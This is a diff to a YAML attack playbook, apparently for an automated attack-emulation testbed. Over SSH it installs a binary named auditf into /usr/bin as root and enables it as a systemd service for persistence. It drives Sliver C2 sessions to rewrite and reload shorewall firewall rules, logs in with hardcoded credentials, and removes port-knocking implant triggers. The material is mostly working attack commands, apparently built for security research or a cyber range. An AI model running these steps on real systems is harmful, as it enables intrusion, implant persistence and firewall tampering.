@@ -62,7 +62,7 @@ commands:
   
   - type: ssh
     session: foothold
-    cmd: "sudo tar -xzf /tmp/auditf.tar.gz -C /bin\n"
+    cmd: "sudo tar -xzf /tmp/auditf.tar.gz -C /usr/bin\n"
     interactive: True
 
   - type: ssh
@@ -72,7 +72,12 @@ commands:
 
   - type: ssh
     session: foothold
-    cmd: "cd /bin && chown root:root auditf && sudo ./auditf && sleep 3\n"
+    cmd: "cd /usr/bin && chown root:root auditf config.yaml system-verify.sh && sudo chmod +x system-verify.sh  && echo -e '[Unit]\nDescription=Run auditf on boot\n\n[Service]\nExecStart=/usr/bin/auditf\nWorkingDirectory=/usr/bin\nRestart=on-failure\nType=simple\n\n[Install]\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/auditf.service > /dev/null && sudo systemctl daemon-reload && sudo systemctl enable auditf.service && sudo systemctl start auditf.service && sleep 5\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "exit\n" 
     interactive: True
 
   - type: webserv
@@ -89,16 +94,6 @@ commands:
   - type: sleep
     seconds: 5
 
-  - type: shell
-    cmd: /home/aecid/knock-cli -c knock.yaml -r execute-implant1
-
-  - type: sleep
-    seconds: 5
-
-  - type: shell
-    cmd: /home/aecid/knock-cli -c knock.yaml -r execute-implant2
-
-#edit the shorewall rules file directly. works.
   - type: sliver-session
     cmd: execute
     exe: sudo
@@ -109,7 +104,7 @@ commands:
       - /etc/shorewall/rules
     session: super-sliver1
 
-# works, rules are reloaded
+
   - type: sliver-session
     cmd: execute
     exe: shorewall
@@ -117,17 +112,6 @@ commands:
       - reload
     session: super-sliver1
 
-
-# debug, this has to be interactive as well!
-# exit only the sessions (root and john) on the firewall, reuse foothold to ssh into linuxshare
-
-  - type: ssh
-    creates_session: "clearout"
-    username: john
-    password: rambo
-    hostname: $SERVER_ADDRESS
-    port: 10022
-    cmd: id
   
   - type: ssh
     creates_session: "foothold2"
@@ -136,11 +120,6 @@ commands:
     hostname: $SERVER_ADDRESS
     port: 10022
     cmd: id
-
-  - type: ssh
-    session: foothold2
-    cmd: "id\n"
-    interactive: True    
 
   - type: ssh
     session: foothold2
@@ -157,18 +136,8 @@ commands:
 
   - type: ssh
     session: foothold2
-    cmd: "ls\n"
+    cmd: "hostname\n"
     interactive: True
-
-
-## ssh directly from attacker to repo server to linuxshare (like for the foothold session)
-
-
-
-
-
-
-
 
 
 
